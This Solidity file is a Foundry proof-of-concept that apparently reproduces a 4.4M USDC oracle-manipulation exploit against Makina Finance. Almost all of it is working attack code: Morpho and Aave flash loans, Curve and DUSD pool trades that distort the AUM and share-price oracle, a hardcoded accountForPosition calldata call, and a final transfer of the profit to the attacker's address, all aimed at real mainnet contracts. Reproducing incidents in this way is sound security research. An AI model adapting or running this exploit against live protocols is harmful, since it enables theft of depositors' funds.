// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "./Makina_FinanceBase.sol";

// @KeyInfo - Total Lost : 4.4M USDC
// Attacker EOA : 0x935bfb495E33f74d2E9735DF1DA66acE442ede48
// Attack Contract : 0x935bfb495e33f74d2e9735df1da66ace442ede48
// Vulnerable Contracts :
//   - Machine: 0x6b006870c83b1cd49e766ac9209f8d68763df721
//   - MachineShareOracle: 0xffcbc7a7eef2796c277095c66067ac749f4ca078
//   - DUSD/USDC Pool: 0x32e616f4f17d43f9a5cd9be0e294727187064cb3
// Attack Tx :https://app.blocksec.com/phalcon/explorer/tx/eth/0x569733b8016ef9418f0b6bde8c14224d9e759e79301499908ecbcd956a0651f5

address constant ATTACKER = 0x935bfb495E33f74d2E9735DF1DA66acE442ede48;
// ERC20 token constants
IERC20 constant USDC_TOKEN = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
IERC20 constant DAI_TOKEN = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
IERC20 constant USDT_TOKEN = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
IERC20 constant DUSD = IERC20(0x1e33E98aF620F1D563fcD3cfd3C75acE841204ef);
IERC20 constant CRV_3 = IERC20(0x6c3F90f043a72FA612cbac8115EE7e52BDe6E490);
IERC20 constant MIM_3LP3CRV = IERC20(
    0x5a6A4D54456819380173272A5E8E9B9904BdF41B
);
IERC20 constant MIM = IERC20(0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3);

IAaveFlashloan constant AAVE_POOL = IAaveFlashloan(
    0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2
);
IMorphoBuleFlashLoan constant MORPHO_POOL = IMorphoBuleFlashLoan(
    0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb
);
ICurve3Pool constant CURVE_3POOL = ICurve3Pool(
    0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7
);
ICurveMIMPool constant MIM_3LP3CRV_F = ICurveMIMPool(
    0x5a6A4D54456819380173272A5E8E9B9904BdF41B
);
IDUSDPool constant DUSD_POOL = IDUSDPool(
    0x32E616F4f17d43f9A5cd9Be0e294727187064cb3
);
IMachine constant MACHINE = IMachine(
    0x6b006870C83b1Cd49E766Ac9209f8d68763Df721
);
IMachineShareOracle constant MACHINE_SHARE_ORACLE = IMachineShareOracle(
    0xFFCBc7A7eEF2796C277095C66067aC749f4cA078
);

address constant ACCOUNTING_PROXY = 0xD1A1C248B253f1fc60eACd90777B9A63F8c8c1BC;
uint256 constant AAVE_FLASHLOAN = 119_409_079_650_188;
uint256 constant MORPHO_FLASHLOAN = 160_590_920_349_812;

interface ICurve3Pool {
    // 3Pool 전용
    function add_liquidity(
        uint256[3] memory amounts,
        uint256 min_mint_amount
    ) external; // returns (uint256)를 제거!

    function remove_liquidity_one_coin(
        uint256 _token_amount,
        int128 i,
        uint256 min_amount
    ) external;

    function totalSupply() external view returns (uint256);

    function balances(uint256 i) external view returns (uint256);
}

// Curve Pool Interface
interface ICurveMIMPool {
    // 1. add_liquidity: N_COINS가 3이므로 uint256[3]을 사용해야 합니다.
    function add_liquidity(
        uint256[2] memory amounts, // uint256[2] -> uint256[3]
        uint256 min_mint_amount
    ) external returns (uint256);

    // 2. remove_liquidity_one_coin: Vyper 코드의 인자명과 타입을 일치시킵니다.
    function remove_liquidity_one_coin(
        uint256 _burn_amount, // 기존 _token_amount -> _burn_amount로 변경
        int128 i, // 코인 인덱스
        uint256 _min_received // 기존 min_amount -> _min_received로 변경
    ) external returns (uint256);

    // 3. exchange: Vyper 코드와 일치합니다.
    function exchange(
        int128 i,
        int128 j,
        uint256 dx,
        uint256 min_dy
    ) external returns (uint256);

    // 4. calc_withdraw_one_coin: Vyper 코드의 인자명을 일치시킵니다.
    function calc_withdraw_one_coin(
        uint256 _token_amount, // Vyper 인자명: _token_amount
        int128 i
    ) external view returns (uint256);
}

interface IDUSDPool {
    function add_liquidity(
        uint256[] memory _amounts,
        uint256 _min_mint_amount
    ) external returns (uint256);

    function remove_liquidity(
        uint256 _amount,
        uint256[2] memory min_amounts
    ) external returns (uint256[2] memory);

    function remove_liquidity_one_coin(
        uint256 _token_amount,
        int128 i,
        uint256 min_amount
    ) external returns (uint256);

    function exchange(
        int128 i,
        int128 j,
        uint256 dx,
        uint256 min_dy
    ) external returns (uint256);

    function get_virtual_price() external view returns (uint256);
}

interface IMachine {
    function updateTotalAum() external returns (uint256);
}

interface IMachineShareOracle {
    function getSharePrice() external view returns (uint256);
}

contract PoC_y0ungminhada is Makina_FinanceBase {
    function setUp() public override {
        super.setUp();
        addVulnerability(VulnerabilityType.ORACLE_MANIPULATION);
        addAttackVector(AttackVector.PRICE_DISTORTION);
        addMitigation(Mitigation.ORACLE_HARDENING);

        fundingToken = address(USDC_TOKEN);
        beneficiary = ATTACKER;

        vm.label(ATTACKER, "AttackerEOA");
    }

    function testExploit() public exploit {
        // 실제 공격자가 EOA로부터 시작하는 것을 시뮬레이션
        vm.startPrank(ATTACKER, ATTACKER);
        console.log(address(this));

        // Exploit 컨트랙트 생성 및 실행
        Exploit exploitContract = new Exploit();
        vm.allowCheatcodes(address(exploitContract));

        exploitContract.attack();

        vm.stopPrank();
    }
}

contract Exploit is Test {
    bool private inMorphoCallback;

    function attack() public {
        // ===== 초기 상태 로깅 =====
        emit log("===== Initial State =====");
        emit log_named_decimal_uint(
            "Contract USDC Balance",
            USDC_TOKEN.balanceOf(address(this)),
            6
        );

        // ===== Step 1: Flashloan =====
        emit log("===== Step 1: Flashloan =====");
        emit log_named_decimal_uint(
            "Requesting Morpho flashloan",
            MORPHO_FLASHLOAN,
            6
        );

        MORPHO_POOL.flashLoan(
            address(USDC_TOKEN),
            MORPHO_FLASHLOAN,
            "" // empty data
        );

        emit log_named_decimal_uint(
            "After flashloan",
            USDC_TOKEN.balanceOf(address(this)),
            6
        );

        emit log("Flashloans repaid successfully");

        USDC_TOKEN.transfer(ATTACKER, USDC_TOKEN.balanceOf(address(this)));
    }

    // ===== Morpho Blue Flashloan Callback =====
    function onMorphoFlashLoan(uint256 assets, bytes calldata data) external {
        require(msg.sender == address(MORPHO_POOL), "Only Morpho");
        require(!inMorphoCallback, "Reentrancy");
        inMorphoCallback = true;

        emit log(">>> Morpho callback received");
        emit log_named_decimal_uint("Assets", assets, 6);
        emit log_named_decimal_uint(
            "Current balance",
            USDC_TOKEN.balanceOf(address(this)),
            6
        );

        emit log_named_decimal_uint(
            "Requesting Aave flashloan",
            AAVE_FLASHLOAN,
            6
        );

        address[] memory aaveAssets = new address[](1);
        aaveAssets[0] = address(USDC_TOKEN);
        uint256[] memory aaveAmounts = new uint256[](1);
        aaveAmounts[0] = AAVE_FLASHLOAN;
        uint256[] memory modes = new uint256[](1);
        modes[0] = 0; // 0 = no debt

        AAVE_POOL.flashLoan(
            address(this),
            aaveAssets,
            aaveAmounts,
            modes,
            address(this),
            "",
            0
        );

        // Morpho에 상환 (Morpho Blue는 수수료 없음)
        // Morpho Blue는 콜백 종료 후 자동으로 transferFrom을 호출하므로
        // approve만 해주면 됩니다 (transfer 하지 않음!)
        emit log_named_decimal_uint("Repaying to Morpho", assets, 6);
        USDC_TOKEN.approve(address(MORPHO_POOL), assets);

        inMorphoCallback = false;
    }

    // ===== Aave Flashloan Callback =====
    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        require(msg.sender == address(AAVE_POOL), "Only Aave");

        emit log(">>> Aave callback received");
        emit log_named_decimal_uint("Amount", amounts[0], 6);
        emit log_named_decimal_uint("Premium", premiums[0], 6);
        emit log_named_decimal_uint(
            "Total balance",
            USDC_TOKEN.balanceOf(address(this)),
            6
        );
        // ===== Pre-approve All Tokens =====
        emit log("===== Pre-approve All Tokens =====");
        _approveAll();
        emit log("All approvals completed");

        emit log("===== Step 2: Execute Attack =====");
        _Round1();
        _Round2();

        // Aave에 상환 (원금 + 프리미엄)
        uint256 aaveRepay = amounts[0] + premiums[0];
        emit log_named_decimal_uint("Repaying to Aave", aaveRepay, 6);
        USDC_TOKEN.approve(address(AAVE_POOL), aaveRepay);

        return true;
    }

    // ===== Helper: approve all tokens =====
    function _approveAll() internal {
        // USDC approvals
        USDC_TOKEN.approve(address(CURVE_3POOL), type(uint256).max);
        USDC_TOKEN.approve(address(DUSD_POOL), type(uint256).max);
        USDC_TOKEN.approve(address(AAVE_POOL), type(uint256).max);

        // 3Crv approvals
        CRV_3.approve(address(MIM_3LP3CRV_F), type(uint256).max);

        // MIM-3LP3CRV approvals
        MIM_3LP3CRV.approve(address(MIM_3LP3CRV_F), type(uint256).max);

        // MIM approvals
        MIM.approve(address(MIM_3LP3CRV_F), type(uint256).max);

        // DUSD approvals
        DUSD.approve(address(DUSD_POOL), type(uint256).max);
    }

    // ===== Helper: call accountForPosition =====
    function _callAccountForPosition() internal returns (bool) {
        bytes
            memory accountForPositionCalldata = hex"9341a475000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000f819a666d560f6ce6f065fe9be046950000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000012000000000000000000000000000000000000000000000000000000000000001a00000000000000000000000000000000000000000000000000000000000000320000000000000000000000000000000001f000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000062000000000000000000000000000000000000000000000000000000000000000030000000000000000000000006b175474e89094c44da98b954eedeac495271d0f000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48000000000000000000000000dac17f958d2ee523a2206206994597c13d831ec7000000000000000000000000000000000000000000000000000000000000000b70a082310104ff0000000004fd5abf66b003881b88567eb9ed9c651f14dc47716d5433e6010406ff00000004836c9007dbd73fcfc473190304c72b7e39babb91cc2b27d7810406ff000000845a6a4d54456819380173272a5e8e9b9904bdf41b62de91e9018405ff000000046e2ed2f457c41f38556ab0c2b1185cc9e6563d8d18160ddd01ff0000000000086c3f90f043a72fa612cbac8115ee7e52bde6e4904903b0d10105ff0000000005bebc44782c7db0a1a60cb6fe97d0b483032ff1c74903b0d10106ff0000000006bebc44782c7db0a1a60cb6fe97d0b483032ff1c74903b0d10107ff0000000007bebc44782c7db0a1a60cb6fe97d0b483032ff1c7aa9a091201050408ff000000836c9007dbd73fcfc473190304c72b7e39babb91aa9a091201060408ff000001836c9007dbd73fcfc473190304c72b7e39babb91aa9a091201070408ff000002836c9007dbd73fcfc473190304c72b7e39babb910000000000000000000000000000000000000000000000000000000000000009000000000000000000000000000000000000000000000000000000000000012000000000000000000000000000000000000000000000000000000000000001400000000000000000000000000000000000000000000000000000000000000160000000000000000000000000000000000000000000000000000000000000018000000000000000000000000000000000000000000000000000000000000001c000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000240000000000000000000000000000000000000000000000000000000000000028000000000000000000000000000000000000000000000000000000000000002c00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000020ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000d1a1c248b253f1fc60eacd90777b9a63f8c8c1bc00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000007a7a3f0f3dbca12895d1f9424e8d0a924d50c92edfec3f817082763f73cb4cd5af326b46750aa6deec7344bb6f7243a395bcfde2680300e16f1bbff78672cbf3c8c6626860a4b2368ed8caf9fd5b14b90d151c3ca390b7aff38dfe7003b5d421d166be3838e86d1af766aeb93493d81b89e564c96c2f8decb94b400912de6afedede17ea0feb39c3e2c3b900b4a95f239f010c251afb46a89984d868151c5b209bf97f0d554ad3b05a210efb4de2a4930747e423e87b1fb139b63fcc94f17e286ae44b282d93e68621a7e6efa1e9b9893cc74b52a65196a60693a9e325c0fc401";

        (bool success, bytes memory returnData) = ACCOUNTING_PROXY.call(
            accountForPositionCalldata
        );

        if (success) {
            emit log("accountForPosition SUCCESS!");
            emit log("MachineStorage updated with position information");
        } else {
            emit log("accountForPosition FAILED");
            if (returnData.length > 0) {
                emit log("Revert reason:");
                emit log_bytes(returnData);
            } else {
                emit log("No revert reason (may require special permissions)");
            }
            emit log("WARNING: AUM update may not reflect manipulated prices");
        }

        return success;
    }

    function _Round1() internal {
        emit log("===== Attack Execution Start =====");

        emit log_named_decimal_uint(
            "Total USDC available",
            USDC_TOKEN.balanceOf(address(this)),
            6
        );
        emit log("---- Round 1 ----");
        // ===== Step 2: DUSD Pool add liquidity =====
        emit log("----- Step2-1: DUSD Pool add liquidity -----");

        uint256 dusdPoolAmount = 100_000_000 * 1e6; // 100M USDC

        uint256[] memory dusdAmounts = new uint256[](2);
        dusdAmounts[0] = dusdPoolAmount; // USDC
        dusdAmounts[1] = 0; // DUSD

        uint256 dusdLpMinted = DUSD_POOL.add_liquidity(dusdAmounts, 0);
        emit log_named_decimal_uint("DUSD Pool LP minted", dusdLpMinted, 18);

        // ===== Step 2: DUSD-USDC Exchange =====
        emit log("----- Step 2-2: Exchange USDC -> DUSD -----");

        uint256 exchangeAmount = 10_000_000 * 1e6; // 10M USDC
        uint256 dusdReceived = DUSD_POOL.exchange(0, 1, exchangeAmount, 0);
        emit log_named_decimal_uint("USDC swapped -> DUSD", dusdReceived, 18);

        emit log("===== Step 3: Curve Manipulation =====");

        emit log("----- Step 3-1: 3Pool add liquidity -----");

        // 남은 USDC의 대부분을 3Pool에 추가
        uint256 pool3Amount = 170_000_000 * 1e6; // 170M USDC

        uint256[3] memory amounts3Pool = [
            uint256(0), // DAI
            pool3Amount, // USDC (index 1)
            uint256(0) // USDT
        ];

        CURVE_3POOL.add_liquidity(amounts3Pool, 0);

        uint256 my3CrvBalance = CRV_3.balanceOf(address(this));
        emit log_named_decimal_uint("3Crv LP received", my3CrvBalance, 18);

        // ===== Step 4: MIM-3LP3CRV-f add liquidity =====
        emit log("----- Step 3-2: MIM-3LP3CRV-f add liquidity -----");

        uint256 crv3ToAdd = 30_000_000 * 1e18; // 30M 3Crv

        uint256[2] memory amountsMIM = [
            uint256(0), // MIM
            crv3ToAdd // 3Crv
        ];

        uint256 mimLpMinted = MIM_3LP3CRV_F.add_liquidity(amountsMIM, 0);
        emit log_named_decimal_uint("MIM-3LP3CRV-f LP minted", mimLpMinted, 18);

        // ===== Step 5: MIM-3LP3CRV-f에서 MIM 제거 =====
        emit log("----- Step 3-3: Remove liquidity (get MIM) -----");

        uint256 lpToRemove = 15_000_000 * 1e18; // 15M LP
        uint256 mimReceived = MIM_3LP3CRV_F.remove_liquidity_one_coin(
            lpToRemove,
            0, // MIM index
            0
        );
        emit log_named_decimal_uint(
            "MIM-3LP LP removed -> MIM",
            mimReceived,
            18
        );

        // ===== CRITICAL Step 6: Exchange BEFORE updateTotalAum =====
        emit log(
            "----- Step 3-4: Exchange 3Crv -> MIM (BEFORE AUM update) -----"
        );

        uint256 crv3ToExchange = 120_000_000 * 1e18; // 120M 3Crv
        uint256 mimFromExchange = MIM_3LP3CRV_F.exchange(
            1, // from 3Crv (index 1)
            0, // to MIM (index 0)
            crv3ToExchange,
            0
        );
        emit log_named_decimal_uint("3Crv swapped -> MIM", mimFromExchange, 18);

        emit log("===== Step 4: Update AUM & Oracle Manipulation =====");

        _callAccountForPosition();

        uint256 priceBefore = MACHINE_SHARE_ORACLE.getSharePrice();

        uint256 updatedAum = MACHINE.updateTotalAum();
        emit log_named_uint("Updated AUM", updatedAum);

        uint256 priceAfter = MACHINE_SHARE_ORACLE.getSharePrice();
        emit log_named_uint("sharePrice BEFORE update", priceBefore);
        emit log_named_uint("sharePrice AFTER update", priceAfter);

        emit log("===== Step 5: Unwind Positions =====");
        // DUSD -> USDC
        DUSD_POOL.exchange(1, 0, 9_215_229_240_302_006_980_932_922, 0);
        emit log_named_decimal_uint(
            "DUSD -> USDC",
            USDC_TOKEN.balanceOf(address(this)),
            6
        );

        // DUSD Pool LP 제거 -> USDC
        uint256 removeLiquidityResult = DUSD_POOL.remove_liquidity_one_coin(
            99_206_722_150_127_812_419_545_815,
            0,
            0
        );
        emit log_named_decimal_uint(
            "DUSD LP removed -> USDC",
            removeLiquidityResult,
            6
        );
        emit log_named_decimal_uint(
            "USDC balance after DUSD LP removal",
            USDC_TOKEN.balanceOf(address(this)),
            6
        );

        // MIM -> 3Crv
        uint256 exchangeResult = MIM_3LP3CRV_F.exchange(
            0,
            1,
            37_742_942_705_126_949_207_991,
            0
        );
        emit log_named_decimal_uint("MIM swapped -> 3Crv", exchangeResult, 18);

        // MIM-3LP LP 제거 -> 3Crv
        uint256 removeMIM3Crvf = MIM_3LP3CRV_F.remove_liquidity_one_coin(
            15_642_770_411_109_495_728_143_125,
            1,
            0
        );
        emit log_named_decimal_uint(
            "MIM-3LP LP removed -> 3Crv",
            removeMIM3Crvf,
            18
        );

        // MIM -> 3Crv
        uint256 removeMIM = MIM_3LP3CRV_F.exchange(
            0,
            1,
            13_163_315_338_344_059_156_793_384,
            0
        );
        emit log_named_decimal_uint("MIM final swap -> 3Crv", removeMIM, 18);

        CURVE_3POOL.remove_liquidity_one_coin(
            163_075_271_472_419_449_961_322_235,
            1,
            0
        );

        emit log("----- Step 6-2: Aum Update -----");

        _callAccountForPosition();
        uint256 priceBefore2 = MACHINE_SHARE_ORACLE.getSharePrice();

        uint256 updatedAum2 = MACHINE.updateTotalAum();
        emit log_named_uint("Updated AUM", updatedAum2);

        uint256 priceAfter2 = MACHINE_SHARE_ORACLE.getSharePrice();
        emit log_named_uint("sharePrice BEFORE update", priceBefore2);
        emit log_named_uint("sharePrice AFTER update", priceAfter2);
    }

    function _Round2() internal {
        emit log("---- Round 2 ----");
        // ===== Step 1: DUSD Pool add liquidity =====
        emit log("----- Step2-1: DUSD Pool add liquidity -----");

        uint256 dusdPoolAmount = 100_000_000 * 1e6; // 100M USDC

        uint256[] memory dusdAmounts = new uint256[](2);
        dusdAmounts[0] = dusdPoolAmount; // USDC
        dusdAmounts[1] = 0; // DUSD

        uint256 dusdLpMinted = DUSD_POOL.add_liquidity(dusdAmounts, 0);
        emit log_named_decimal_uint("DUSD Pool LP minted", dusdLpMinted, 18);

        // ===== Step 2: DUSD-USDC Exchange =====
        emit log("----- Step 2-2: Exchange USDC -> DUSD -----");

        uint256 exchangeAmount = 10_000_000 * 1e6; // 10M USDC
        uint256 dusdReceived = DUSD_POOL.exchange(0, 1, exchangeAmount, 0);
        emit log_named_decimal_uint("USDC swapped -> DUSD", dusdReceived, 18);

        emit log("===== Step 3: Curve Manipulation =====");

        emit log("----- Step 3-1: 3Pool add liquidity -----");

        uint256 pool3Amount = 170_000_000 * 1e6; // 170M USDC

        uint256[3] memory amounts3Pool = [
            uint256(0), // DAI
            pool3Amount, // USDC (index 1)
            uint256(0) // USDT
        ];

        CURVE_3POOL.add_liquidity(amounts3Pool, 0);

        uint256 my3CrvBalance = CRV_3.balanceOf(address(this));
        emit log_named_decimal_uint("3Crv LP received", my3CrvBalance, 18);

        // ===== Step 4: MIM-3LP3CRV-f 유동성 추가 =====
        emit log("----- Step 3-2: MIM-3LP3CRV-f add liquidity -----");

        // 받은 3Crv의 일부를 MIM Pool에 추가
        uint256 crv3ToAdd = 30_000_000 * 1e18; // 30M 3Crv

        uint256[2] memory amountsMIM = [
            uint256(0), // MIM
            crv3ToAdd // 3Crv
        ];

        uint256 mimLpMinted = MIM_3LP3CRV_F.add_liquidity(amountsMIM, 0);
        emit log_named_decimal_uint("MIM-3LP3CRV-f LP minted", mimLpMinted, 18);

        // ===== Step 5: MIM-3LP3CRV-f에서 MIM 제거 =====
        emit log("----- Step 3-3: Remove liquidity (get MIM) -----");

        uint256 lpToRemove = 15_000_000 * 1e18; // 15M LP
        uint256 mimReceived = MIM_3LP3CRV_F.remove_liquidity_one_coin(
            lpToRemove,
            0, // MIM index
            0
        );
        emit log_named_decimal_uint(
            "MIM-3LP LP removed -> MIM",
            mimReceived,
            18
        );

        // ===== CRITICAL Step 6: Exchange BEFORE updateTotalAum =====
        emit log(
            "----- Step 3-4: Exchange 3Crv -> MIM (BEFORE AUM update) -----"
        );

        uint256 crv3ToExchange = 120_000_000 * 1e18; // 120M 3Crv
        uint256 mimFromExchange = MIM_3LP3CRV_F.exchange(
            1, // from 3Crv (index 1)
            0, // to MIM (index 0)
            crv3ToExchange,
            0
        );
        emit log_named_decimal_uint("3Crv swapped -> MIM", mimFromExchange, 18);

        emit log("===== Step 4: Update AUM & Oracle Manipulation =====");

        _callAccountForPosition();

        uint256 priceBefore = MACHINE_SHARE_ORACLE.getSharePrice();

        // Root Cause: 취약한 AUM 업데이트 호출
        uint256 updatedAum = MACHINE.updateTotalAum();
        emit log_named_uint("Updated AUM", updatedAum);

        uint256 priceAfter = MACHINE_SHARE_ORACLE.getSharePrice();
        emit log_named_uint("sharePrice BEFORE update", priceBefore);
        emit log_named_uint("sharePrice AFTER update", priceAfter);

        emit log("===== Step 5: Unwind Positions =====");
        // DUSD -> USDC
        DUSD_POOL.exchange(1, 0, 9_235_449_575_073_302_649_936_323, 0);

        // DUSD Pool LP 제거 -> USDC
        uint256 removeLiquidityResult = DUSD_POOL.remove_liquidity_one_coin(
            125_494_733_618_298_444_225_134_510,
            0,
            0
        );
        emit log_named_decimal_uint(
            "DUSD LP removed -> USDC",
            removeLiquidityResult,
            6
        );

        // MIM -> 3Crv
        uint256 exchangeResult = MIM_3LP3CRV_F.exchange(
            0,
            1,
            33_519_108_871_652_916_056_737,
            0
        );
        emit log_named_decimal_uint("MIM swapped -> 3Crv", exchangeResult, 18);

        // MIM-3LP LP 제거 -> 3Crv
        uint256 removeMIM3Crvf = MIM_3LP3CRV_F.remove_liquidity_one_coin(
            15_112_391_623_347_339_534_431_675,
            1,
            0
        );
        emit log_named_decimal_uint(
            "MIM-3LP LP removed -> 3Crv",
            removeMIM3Crvf,
            18
        );

        // MIM -> 3Crv (최종)
        uint256 removeMIM = MIM_3LP3CRV_F.exchange(
            0,
            1,
            13_164_612_626_248_311_211_432_109,
            0
        );
        emit log_named_decimal_uint("MIM final swap -> 3Crv", removeMIM, 18);

        CURVE_3POOL.remove_liquidity_one_coin(
            163_098_693_870_509_210_725_853_228,
            1,
            0
        );

        emit log("----- Step 6-2: Aum Update -----");

        _callAccountForPosition();
        uint256 priceBefore2 = MACHINE_SHARE_ORACLE.getSharePrice();

        // Root Cause: 취약한 AUM 업데이트 호출
        uint256 updatedAum2 = MACHINE.updateTotalAum();
        emit log_named_uint("Updated AUM", updatedAum2);

        uint256 priceAfter2 = MACHINE_SHARE_ORACLE.getSharePrice();
        emit log_named_uint("sharePrice BEFORE update", priceBefore2);
        emit log_named_uint("sharePrice AFTER update", priceAfter2);

        emit log("===== Attack Execution Finished =====");
    }
}
